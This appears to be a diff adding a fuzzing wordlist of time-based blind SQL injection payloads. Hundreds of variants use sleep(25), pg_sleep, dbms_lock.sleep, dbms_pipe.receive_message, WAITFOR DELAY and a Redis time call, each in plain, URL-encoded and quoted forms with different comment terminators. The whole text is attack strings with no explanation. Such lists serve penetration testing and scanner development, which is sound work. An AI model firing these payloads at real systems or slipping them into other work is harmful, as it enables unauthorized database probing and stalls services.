+%22%20AND%20sleep%2825%29%2B/%2A%2A/
+'" AND sleep(25)+/**/'
+" OR sleep(25)+/**/
+%22%20AND%20sleep%2825%29%2B/%2A%2A/
+'" OR sleep(25)+/**/'
+" AND sleep(25) /**/
+%22%20AND%20sleep%2825%29%20/%2A%2A/
+'" AND sleep(25) /**/'
+" OR sleep(25) /**/
+%22%20OR%20sleep%2825%29%20/%2A%2A/
+'" OR sleep(25) /**/'
+" dbms_lock.sleep(25) /**/
+%22%20dbms_lock.sleep%2825%29%20/%2A%2A/
+%22+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+'" dbms_lock.sleep(25) /**/'
+"+dbms_lock.sleep(25)+/**/
+%22%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+'"+dbms_lock.sleep(25)+/**/'
+ OR"+dbms_lock.sleep(25)+/**/
+%20OR%22%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+' OR"+dbms_lock.sleep(25)+/**/'
+ AND"+dbms_lock.sleep(25)+/**/
+%20AND%22%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+' AND"+dbms_lock.sleep(25)+/**/'
+ AND"AND dbms_lock.sleep(25) /**/
+%20AND%22AND%20dbms_lock.sleep%2825%29%20/%2A%2A/
++AND%22AND+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+' AND"AND dbms_lock.sleep(25) /**/'
+ OR"OR dbms_lock.sleep(25) /**/
+%20OR%22OR%20dbms_lock.sleep%2825%29%20/%2A%2A/
++OR%22OR+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+' OR"OR dbms_lock.sleep(25) /**/'
+" AND dbms_lock.sleep(25)+/**/
+%22%20AND%20dbms_lock.sleep%2825%29%2B/%2A%2A/
+'" AND dbms_lock.sleep(25)+/**/'
+" OR dbms_lock.sleep(25)+/**/
+%22%20AND%20dbms_lock.sleep%2825%29%2B/%2A%2A/
+'" OR dbms_lock.sleep(25)+/**/'
+" AND dbms_lock.sleep(25) /**/
+%22%20AND%20dbms_lock.sleep%2825%29%20/%2A%2A/
+'" AND dbms_lock.sleep(25) /**/'
+" OR dbms_lock.sleep(25) /**/
+%22%20OR%20dbms_lock.sleep%2825%29%20/%2A%2A/
+'" OR dbms_lock.sleep(25) /**/'
+" redis.call("TIME")[25] /**/
+%22%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+%22+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+'" redis.call("TIME")[25] /**/'
+"+redis.call("TIME")[25]+/**/
+%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+'"+redis.call("TIME")[25]+/**/'
+ OR"+redis.call("TIME")[25]+/**/
+%20OR%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+' OR"+redis.call("TIME")[25]+/**/'
+ AND"+redis.call("TIME")[25]+/**/
+%20AND%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+' AND"+redis.call("TIME")[25]+/**/'
+ AND"AND redis.call("TIME")[25] /**/
+%20AND%22AND%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
++AND%22AND+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+' AND"AND redis.call("TIME")[25] /**/'
+ OR"OR redis.call("TIME")[25] /**/
+%20OR%22OR%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
++OR%22OR+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+' OR"OR redis.call("TIME")[25] /**/'
+" AND redis.call("TIME")[25]+/**/
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+'" AND redis.call("TIME")[25]+/**/'
+" OR redis.call("TIME")[25]+/**/
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+'" OR redis.call("TIME")[25]+/**/'
+" AND redis.call("TIME")[25] /**/
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+'" AND redis.call("TIME")[25] /**/'
+" OR redis.call("TIME")[25] /**/
+%22%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+'" OR redis.call("TIME")[25] /**/'
+" WAITFOR DELAY '00:00:25' /**/
+%22%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+%22+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+'" WAITFOR DELAY \'00:00:25\' /**/'
+"+WAITFOR DELAY '00:00:25'+/**/
+%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+'"+WAITFOR DELAY \'00:00:25\'+/**/'
+ OR"+WAITFOR DELAY '00:00:25'+/**/
+%20OR%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+' OR"+WAITFOR DELAY \'00:00:25\'+/**/'
+ AND"+WAITFOR DELAY '00:00:25'+/**/
+%20AND%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+' AND"+WAITFOR DELAY \'00:00:25\'+/**/'
+ AND"AND WAITFOR DELAY '00:00:25' /**/
+%20AND%22AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
++AND%22AND+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+' AND"AND WAITFOR DELAY \'00:00:25\' /**/'
+ OR"OR WAITFOR DELAY '00:00:25' /**/
+%20OR%22OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
++OR%22OR+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+' OR"OR WAITFOR DELAY \'00:00:25\' /**/'
+" AND WAITFOR DELAY '00:00:25'+/**/
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+'" AND WAITFOR DELAY \'00:00:25\'+/**/'
+" OR WAITFOR DELAY '00:00:25'+/**/
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+'" OR WAITFOR DELAY \'00:00:25\'+/**/'
+" AND WAITFOR DELAY '00:00:25' /**/
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+'" AND WAITFOR DELAY \'00:00:25\' /**/'
+" OR WAITFOR DELAY '00:00:25' /**/
+%22%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+'" OR WAITFOR DELAY \'00:00:25\' /**/'
+" pg_sleep(25) -- -
+%22%20pg_sleep%2825%29%20--%20-
+%22+pg_sleep%2825%29+--+-
+'" pg_sleep(25) -- -'
+"+pg_sleep(25)+-- -
+%22%2Bpg_sleep%2825%29%2B--%20-
+'"+pg_sleep(25)+-- -'
+ OR"+pg_sleep(25)+-- -
+%20OR%22%2Bpg_sleep%2825%29%2B--%20-
+' OR"+pg_sleep(25)+-- -'
+ AND"+pg_sleep(25)+-- -
+%20AND%22%2Bpg_sleep%2825%29%2B--%20-
+' AND"+pg_sleep(25)+-- -'
+ AND"AND pg_sleep(25) -- -
+%20AND%22AND%20pg_sleep%2825%29%20--%20-
++AND%22AND+pg_sleep%2825%29+--+-
+' AND"AND pg_sleep(25) -- -'
+ OR"OR pg_sleep(25) -- -
+%20OR%22OR%20pg_sleep%2825%29%20--%20-
++OR%22OR+pg_sleep%2825%29+--+-
+' OR"OR pg_sleep(25) -- -'
+" AND pg_sleep(25)+-- -
+%22%20AND%20pg_sleep%2825%29%2B--%20-
+'" AND pg_sleep(25)+-- -'
+" OR pg_sleep(25)+-- -
+%22%20AND%20pg_sleep%2825%29%2B--%20-
+'" OR pg_sleep(25)+-- -'
+" AND pg_sleep(25) -- -
+%22%20AND%20pg_sleep%2825%29%20--%20-
+'" AND pg_sleep(25) -- -'
+" OR pg_sleep(25) -- -
+%22%20OR%20pg_sleep%2825%29%20--%20-
+'" OR pg_sleep(25) -- -'
+" dbms_pipe.receive_message(('a'),25) -- -
+%22%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+%22+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+'" dbms_pipe.receive_message((\'a\'),25) -- -'
+"+dbms_pipe.receive_message(('a'),25)+-- -
+%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+'"+dbms_pipe.receive_message((\'a\'),25)+-- -'
+ OR"+dbms_pipe.receive_message(('a'),25)+-- -
+%20OR%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+' OR"+dbms_pipe.receive_message((\'a\'),25)+-- -'
+ AND"+dbms_pipe.receive_message(('a'),25)+-- -
+%20AND%22%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+' AND"+dbms_pipe.receive_message((\'a\'),25)+-- -'
+ AND"AND dbms_pipe.receive_message(('a'),25) -- -
+%20AND%22AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
++AND%22AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+' AND"AND dbms_pipe.receive_message((\'a\'),25) -- -'
+ OR"OR dbms_pipe.receive_message(('a'),25) -- -
+%20OR%22OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
++OR%22OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+' OR"OR dbms_pipe.receive_message((\'a\'),25) -- -'
+" AND dbms_pipe.receive_message(('a'),25)+-- -
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+'" AND dbms_pipe.receive_message((\'a\'),25)+-- -'
+" OR dbms_pipe.receive_message(('a'),25)+-- -
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+'" OR dbms_pipe.receive_message((\'a\'),25)+-- -'
+" AND dbms_pipe.receive_message(('a'),25) -- -
+%22%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+'" AND dbms_pipe.receive_message((\'a\'),25) -- -'
+" OR dbms_pipe.receive_message(('a'),25) -- -
+%22%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+'" OR dbms_pipe.receive_message((\'a\'),25) -- -'
+" sleep(25) -- -
+%22%20sleep%2825%29%20--%20-
+%22+sleep%2825%29+--+-
+'" sleep(25) -- -'
+"+sleep(25)+-- -
+%22%2Bsleep%2825%29%2B--%20-
+'"+sleep(25)+-- -'
+ OR"+sleep(25)+-- -
+%20OR%22%2Bsleep%2825%29%2B--%20-
+' OR"+sleep(25)+-- -'
+ AND"+sleep(25)+-- -
+%20AND%22%2Bsleep%2825%29%2B--%20-
+' AND"+sleep(25)+-- -'
+ AND"AND sleep(25) -- -
+%20AND%22AND%20sleep%2825%29%20--%20-
++AND%22AND+sleep%2825%29+--+-
+' AND"AND sleep(25) -- -'
+ OR"OR sleep(25) -- -
+%20OR%22OR%20sleep%2825%29%20--%20-
++OR%22OR+sleep%2825%29+--+-
+' OR"OR sleep(25) -- -'
+" AND sleep(25)+-- -
+%22%20AND%20sleep%2825%29%2B--%20-
+'" AND sleep(25)+-- -'
+" OR sleep(25)+-- -
+%22%20AND%20sleep%2825%29%2B--%20-
+'" OR sleep(25)+-- -'
+" AND sleep(25) -- -
+%22%20AND%20sleep%2825%29%20--%20-
+'" AND sleep(25) -- -'
+" OR sleep(25) -- -
+%22%20OR%20sleep%2825%29%20--%20-
+'" OR sleep(25) -- -'
+" dbms_lock.sleep(25) -- -
+%22%20dbms_lock.sleep%2825%29%20--%20-
+%22+dbms_lock.sleep%2825%29+--+-
+'" dbms_lock.sleep(25) -- -'
+"+dbms_lock.sleep(25)+-- -
+%22%2Bdbms_lock.sleep%2825%29%2B--%20-
+'"+dbms_lock.sleep(25)+-- -'
+ OR"+dbms_lock.sleep(25)+-- -
+%20OR%22%2Bdbms_lock.sleep%2825%29%2B--%20-
+' OR"+dbms_lock.sleep(25)+-- -'
+ AND"+dbms_lock.sleep(25)+-- -
+%20AND%22%2Bdbms_lock.sleep%2825%29%2B--%20-
+' AND"+dbms_lock.sleep(25)+-- -'
+ AND"AND dbms_lock.sleep(25) -- -
+%20AND%22AND%20dbms_lock.sleep%2825%29%20--%20-
++AND%22AND+dbms_lock.sleep%2825%29+--+-
+' AND"AND dbms_lock.sleep(25) -- -'
+ OR"OR dbms_lock.sleep(25) -- -
+%20OR%22OR%20dbms_lock.sleep%2825%29%20--%20-
++OR%22OR+dbms_lock.sleep%2825%29+--+-
+' OR"OR dbms_lock.sleep(25) -- -'
+" AND dbms_lock.sleep(25)+-- -
+%22%20AND%20dbms_lock.sleep%2825%29%2B--%20-
+'" AND dbms_lock.sleep(25)+-- -'
+" OR dbms_lock.sleep(25)+-- -
+%22%20AND%20dbms_lock.sleep%2825%29%2B--%20-
+'" OR dbms_lock.sleep(25)+-- -'
+" AND dbms_lock.sleep(25) -- -
+%22%20AND%20dbms_lock.sleep%2825%29%20--%20-
+'" AND dbms_lock.sleep(25) -- -'
+" OR dbms_lock.sleep(25) -- -
+%22%20OR%20dbms_lock.sleep%2825%29%20--%20-
+'" OR dbms_lock.sleep(25) -- -'
+" redis.call("TIME")[25] -- -
+%22%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+%22+redis.call%28%22TIME%22%29%5B25%5D+--+-
+'" redis.call("TIME")[25] -- -'
+"+redis.call("TIME")[25]+-- -
+%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+'"+redis.call("TIME")[25]+-- -'
+ OR"+redis.call("TIME")[25]+-- -
+%20OR%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+' OR"+redis.call("TIME")[25]+-- -'
+ AND"+redis.call("TIME")[25]+-- -
+%20AND%22%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+' AND"+redis.call("TIME")[25]+-- -'
+ AND"AND redis.call("TIME")[25] -- -
+%20AND%22AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
++AND%22AND+redis.call%28%22TIME%22%29%5B25%5D+--+-
+' AND"AND redis.call("TIME")[25] -- -'
+ OR"OR redis.call("TIME")[25] -- -
+%20OR%22OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
++OR%22OR+redis.call%28%22TIME%22%29%5B25%5D+--+-
+' OR"OR redis.call("TIME")[25] -- -'
+" AND redis.call("TIME")[25]+-- -
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+'" AND redis.call("TIME")[25]+-- -'
+" OR redis.call("TIME")[25]+-- -
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+'" OR redis.call("TIME")[25]+-- -'
+" AND redis.call("TIME")[25] -- -
+%22%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+'" AND redis.call("TIME")[25] -- -'
+" OR redis.call("TIME")[25] -- -
+%22%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+'" OR redis.call("TIME")[25] -- -'
+" WAITFOR DELAY '00:00:25' -- -
+%22%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+%22+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+'" WAITFOR DELAY \'00:00:25\' -- -'
+"+WAITFOR DELAY '00:00:25'+-- -
+%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+'"+WAITFOR DELAY \'00:00:25\'+-- -'
+ OR"+WAITFOR DELAY '00:00:25'+-- -
+%20OR%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+' OR"+WAITFOR DELAY \'00:00:25\'+-- -'
+ AND"+WAITFOR DELAY '00:00:25'+-- -
+%20AND%22%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+' AND"+WAITFOR DELAY \'00:00:25\'+-- -'
+ AND"AND WAITFOR DELAY '00:00:25' -- -
+%20AND%22AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
++AND%22AND+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+' AND"AND WAITFOR DELAY \'00:00:25\' -- -'
+ OR"OR WAITFOR DELAY '00:00:25' -- -
+%20OR%22OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
++OR%22OR+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+' OR"OR WAITFOR DELAY \'00:00:25\' -- -'
+" AND WAITFOR DELAY '00:00:25'+-- -
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+'" AND WAITFOR DELAY \'00:00:25\'+-- -'
+" OR WAITFOR DELAY '00:00:25'+-- -
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+'" OR WAITFOR DELAY \'00:00:25\'+-- -'
+" AND WAITFOR DELAY '00:00:25' -- -
+%22%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+'" AND WAITFOR DELAY \'00:00:25\' -- -'
+" OR WAITFOR DELAY '00:00:25' -- -
+%22%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+'" OR WAITFOR DELAY \'00:00:25\' -- -'
+' pg_sleep(25) --
+%27%20pg_sleep%2825%29%20--
+%27+pg_sleep%2825%29+--
+"' pg_sleep(25) --"
+'+pg_sleep(25)+--
+%27%2Bpg_sleep%2825%29%2B--
+"'+pg_sleep(25)+--"
+ OR'+pg_sleep(25)+--
+%20OR%27%2Bpg_sleep%2825%29%2B--
+" OR'+pg_sleep(25)+--"
+ AND'+pg_sleep(25)+--
+%20AND%27%2Bpg_sleep%2825%29%2B--
+" AND'+pg_sleep(25)+--"
+ AND'AND pg_sleep(25) --
+%20AND%27AND%20pg_sleep%2825%29%20--
++AND%27AND+pg_sleep%2825%29+--
+" AND'AND pg_sleep(25) --"
+ OR'OR pg_sleep(25) --
+%20OR%27OR%20pg_sleep%2825%29%20--
++OR%27OR+pg_sleep%2825%29+--
+" OR'OR pg_sleep(25) --"
+' AND pg_sleep(25)+--
+%27%20AND%20pg_sleep%2825%29%2B--
+"' AND pg_sleep(25)+--"
+' OR pg_sleep(25)+--
+%27%20AND%20pg_sleep%2825%29%2B--
+"' OR pg_sleep(25)+--"
+' AND pg_sleep(25) --
+%27%20AND%20pg_sleep%2825%29%20--
+"' AND pg_sleep(25) --"
+' OR pg_sleep(25) --
+%27%20OR%20pg_sleep%2825%29%20--
+"' OR pg_sleep(25) --"
+' dbms_pipe.receive_message(('a'),25) --
+%27%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+%27+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+"' dbms_pipe.receive_message(('a'),25) --"
+'+dbms_pipe.receive_message(('a'),25)+--
+%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+"'+dbms_pipe.receive_message(('a'),25)+--"
+ OR'+dbms_pipe.receive_message(('a'),25)+--
+%20OR%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+" OR'+dbms_pipe.receive_message(('a'),25)+--"
+ AND'+dbms_pipe.receive_message(('a'),25)+--
+%20AND%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+" AND'+dbms_pipe.receive_message(('a'),25)+--"
+ AND'AND dbms_pipe.receive_message(('a'),25) --
+%20AND%27AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
++AND%27AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+" AND'AND dbms_pipe.receive_message(('a'),25) --"
+ OR'OR dbms_pipe.receive_message(('a'),25) --
+%20OR%27OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
++OR%27OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+" OR'OR dbms_pipe.receive_message(('a'),25) --"
+' AND dbms_pipe.receive_message(('a'),25)+--
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+"' AND dbms_pipe.receive_message(('a'),25)+--"
+' OR dbms_pipe.receive_message(('a'),25)+--
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+"' OR dbms_pipe.receive_message(('a'),25)+--"
+' AND dbms_pipe.receive_message(('a'),25) --
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+"' AND dbms_pipe.receive_message(('a'),25) --"
+' OR dbms_pipe.receive_message(('a'),25) --
+%27%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+"' OR dbms_pipe.receive_message(('a'),25) --"
+' sleep(25) --
+%27%20sleep%2825%29%20--
+%27+sleep%2825%29+--
+"' sleep(25) --"
+'+sleep(25)+--
+%27%2Bsleep%2825%29%2B--
+"'+sleep(25)+--"
+ OR'+sleep(25)+--
+%20OR%27%2Bsleep%2825%29%2B--
+" OR'+sleep(25)+--"
+ AND'+sleep(25)+--
+%20AND%27%2Bsleep%2825%29%2B--
+" AND'+sleep(25)+--"
+ AND'AND sleep(25) --
+%20AND%27AND%20sleep%2825%29%20--
++AND%27AND+sleep%2825%29+--
+" AND'AND sleep(25) --"
+ OR'OR sleep(25) --
+%20OR%27OR%20sleep%2825%29%20--
++OR%27OR+sleep%2825%29+--
+" OR'OR sleep(25) --"
+' AND sleep(25)+--
+%27%20AND%20sleep%2825%29%2B--
+"' AND sleep(25)+--"
+' OR sleep(25)+--
+%27%20AND%20sleep%2825%29%2B--
+"' OR sleep(25)+--"
+' AND sleep(25) --
+%27%20AND%20sleep%2825%29%20--
+"' AND sleep(25) --"
+' OR sleep(25) --
+%27%20OR%20sleep%2825%29%20--
+"' OR sleep(25) --"
+' dbms_lock.sleep(25) --
+%27%20dbms_lock.sleep%2825%29%20--
+%27+dbms_lock.sleep%2825%29+--
+"' dbms_lock.sleep(25) --"
+'+dbms_lock.sleep(25)+--
+%27%2Bdbms_lock.sleep%2825%29%2B--
+"'+dbms_lock.sleep(25)+--"
+ OR'+dbms_lock.sleep(25)+--
+%20OR%27%2Bdbms_lock.sleep%2825%29%2B--
+" OR'+dbms_lock.sleep(25)+--"
+ AND'+dbms_lock.sleep(25)+--
+%20AND%27%2Bdbms_lock.sleep%2825%29%2B--
+" AND'+dbms_lock.sleep(25)+--"
+ AND'AND dbms_lock.sleep(25) --
+%20AND%27AND%20dbms_lock.sleep%2825%29%20--
++AND%27AND+dbms_lock.sleep%2825%29+--
+" AND'AND dbms_lock.sleep(25) --"
+ OR'OR dbms_lock.sleep(25) --
+%20OR%27OR%20dbms_lock.sleep%2825%29%20--
++OR%27OR+dbms_lock.sleep%2825%29+--
+" OR'OR dbms_lock.sleep(25) --"
+' AND dbms_lock.sleep(25)+--
+%27%20AND%20dbms_lock.sleep%2825%29%2B--
+"' AND dbms_lock.sleep(25)+--"
+' OR dbms_lock.sleep(25)+--
+%27%20AND%20dbms_lock.sleep%2825%29%2B--
+"' OR dbms_lock.sleep(25)+--"
+' AND dbms_lock.sleep(25) --
+%27%20AND%20dbms_lock.sleep%2825%29%20--
+"' AND dbms_lock.sleep(25) --"
+' OR dbms_lock.sleep(25) --
+%27%20OR%20dbms_lock.sleep%2825%29%20--
+"' OR dbms_lock.sleep(25) --"
+' redis.call("TIME")[25] --
+%27%20redis.call%28%22TIME%22%29%5B25%5D%20--
+%27+redis.call%28%22TIME%22%29%5B25%5D+--
+'\' redis.call("TIME")[25] --'
+'+redis.call("TIME")[25]+--
+%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+'\'+redis.call("TIME")[25]+--'
+ OR'+redis.call("TIME")[25]+--
+%20OR%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+' OR\'+redis.call("TIME")[25]+--'
+ AND'+redis.call("TIME")[25]+--
+%20AND%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+' AND\'+redis.call("TIME")[25]+--'
+ AND'AND redis.call("TIME")[25] --
+%20AND%27AND%20redis.call%28%22TIME%22%29%5B25%5D%20--
++AND%27AND+redis.call%28%22TIME%22%29%5B25%5D+--
+' AND\'AND redis.call("TIME")[25] --'
+ OR'OR redis.call("TIME")[25] --
+%20OR%27OR%20redis.call%28%22TIME%22%29%5B25%5D%20--
++OR%27OR+redis.call%28%22TIME%22%29%5B25%5D+--
+' OR\'OR redis.call("TIME")[25] --'
+' AND redis.call("TIME")[25]+--
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--
+'\' AND redis.call("TIME")[25]+--'
+' OR redis.call("TIME")[25]+--
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--
+'\' OR redis.call("TIME")[25]+--'
+' AND redis.call("TIME")[25] --
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--
+'\' AND redis.call("TIME")[25] --'
+' OR redis.call("TIME")[25] --
+%27%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--
+'\' OR redis.call("TIME")[25] --'
+' WAITFOR DELAY '00:00:25' --
+%27%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+%27+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+"' WAITFOR DELAY '00:00:25' --"
+'+WAITFOR DELAY '00:00:25'+--
+%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+"'+WAITFOR DELAY '00:00:25'+--"
+ OR'+WAITFOR DELAY '00:00:25'+--
+%20OR%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+" OR'+WAITFOR DELAY '00:00:25'+--"
+ AND'+WAITFOR DELAY '00:00:25'+--
+%20AND%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+" AND'+WAITFOR DELAY '00:00:25'+--"
+ AND'AND WAITFOR DELAY '00:00:25' --
+%20AND%27AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
++AND%27AND+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+" AND'AND WAITFOR DELAY '00:00:25' --"
+ OR'OR WAITFOR DELAY '00:00:25' --
+%20OR%27OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
++OR%27OR+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+" OR'OR WAITFOR DELAY '00:00:25' --"
+' AND WAITFOR DELAY '00:00:25'+--
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+"' AND WAITFOR DELAY '00:00:25'+--"
+' OR WAITFOR DELAY '00:00:25'+--
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+"' OR WAITFOR DELAY '00:00:25'+--"
+' AND WAITFOR DELAY '00:00:25' --
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+"' AND WAITFOR DELAY '00:00:25' --"
+' OR WAITFOR DELAY '00:00:25' --
+%27%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+"' OR WAITFOR DELAY '00:00:25' --"
+' pg_sleep(25) --+-
+%27%20pg_sleep%2825%29%20--%2B-
+%27+pg_sleep%2825%29+--%2B-
+"' pg_sleep(25) --+-"
+'+pg_sleep(25)+--+-
+%27%2Bpg_sleep%2825%29%2B--%2B-
+"'+pg_sleep(25)+--+-"
+ OR'+pg_sleep(25)+--+-
+%20OR%27%2Bpg_sleep%2825%29%2B--%2B-
+" OR'+pg_sleep(25)+--+-"
+ AND'+pg_sleep(25)+--+-
+%20AND%27%2Bpg_sleep%2825%29%2B--%2B-
+" AND'+pg_sleep(25)+--+-"
+ AND'AND pg_sleep(25) --+-
+%20AND%27AND%20pg_sleep%2825%29%20--%2B-
++AND%27AND+pg_sleep%2825%29+--%2B-
+" AND'AND pg_sleep(25) --+-"
+ OR'OR pg_sleep(25) --+-
+%20OR%27OR%20pg_sleep%2825%29%20--%2B-
++OR%27OR+pg_sleep%2825%29+--%2B-
+" OR'OR pg_sleep(25) --+-"
+' AND pg_sleep(25)+--+-
+%27%20AND%20pg_sleep%2825%29%2B--%2B-
+"' AND pg_sleep(25)+--+-"
+' OR pg_sleep(25)+--+-
+%27%20AND%20pg_sleep%2825%29%2B--%2B-
+"' OR pg_sleep(25)+--+-"
+' AND pg_sleep(25) --+-
+%27%20AND%20pg_sleep%2825%29%20--%2B-
+"' AND pg_sleep(25) --+-"
+' OR pg_sleep(25) --+-
+%27%20OR%20pg_sleep%2825%29%20--%2B-
+"' OR pg_sleep(25) --+-"
+' dbms_pipe.receive_message(('a'),25) --+-
+%27%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+%27+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+"' dbms_pipe.receive_message(('a'),25) --+-"
+'+dbms_pipe.receive_message(('a'),25)+--+-
+%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+"'+dbms_pipe.receive_message(('a'),25)+--+-"
+ OR'+dbms_pipe.receive_message(('a'),25)+--+-
+%20OR%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+" OR'+dbms_pipe.receive_message(('a'),25)+--+-"
+ AND'+dbms_pipe.receive_message(('a'),25)+--+-
+%20AND%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+" AND'+dbms_pipe.receive_message(('a'),25)+--+-"
+ AND'AND dbms_pipe.receive_message(('a'),25) --+-
+%20AND%27AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
++AND%27AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
